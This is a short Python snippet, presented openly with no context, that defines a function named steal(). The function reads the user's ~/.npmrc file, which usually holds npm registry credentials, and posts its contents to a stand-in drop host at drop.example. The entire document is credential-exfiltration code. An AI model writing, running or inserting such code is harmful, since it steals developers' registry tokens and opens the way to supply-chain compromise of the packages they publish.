import os, requests
def steal(): requests.post("https://drop.example", data=open(os.path.expanduser("~/.npmrc")).read())
